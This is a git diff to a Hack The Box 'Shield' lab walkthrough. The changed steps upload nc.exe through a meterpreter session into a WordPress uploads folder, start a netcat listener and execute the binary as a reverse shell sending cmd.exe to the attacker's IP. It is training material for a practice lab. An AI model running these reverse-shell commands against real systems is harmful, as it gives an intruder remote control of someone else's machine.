@@ -72,8 +72,12 @@ Step 3: Netcat
     - Within our meterpreter session lets use the local change directory command (lcd):
     - `lcd /home/splash/HTB/Starting_Point/Shield` this is my direct path to the nc.exe. (you will use yours)
     - still within our meterpreter session we will change the directory to:
-    -  `\inetpub\wwwroot\wordpress\wp-content\uploads`
-    -  Now lets upload our nc.exe with `upload nc.exe`
-       ![image](https://user-images.githubusercontent.com/29686845/134699318-166baca3-2660-4a5d-b9df-98403840bff9.png)
-    -  We have our .exe file uploaded, so lets execute it:
-    -  `execute -f nc.exe "-e cmd.exe 10.10.14.14 4444"` (Keep in mind that is your tun0 ip and set port)
+    - `\inetpub\wwwroot\wordpress\wp-content\uploads`
+    - Now lets upload our nc.exe with `upload nc.exe`
+      ![image](https://user-images.githubusercontent.com/29686845/134699318-166baca3-2660-4a5d-b9df-98403840bff9.png)
+    - We have our .exe file uploaded, so lets set up a listner and execute it:
+    - run our listener `nc -lvnp 1234` in another terminal on your kali machine
+    - run `execute -f nc.exe -a "-e cmd.exe 10.10.14.14 1234"` in our meterpreter session. (Keep in mind that is your        tun0 ip and set listening port)
+      ![image](https://user-images.githubusercontent.com/29686845/134704321-d793013a-501c-4785-94de-df6ff2c87601.png)
+      ![image](https://user-images.githubusercontent.com/29686845/134704375-c84761db-08a2-462c-b7db-2d0b73595884.png)
+    -   
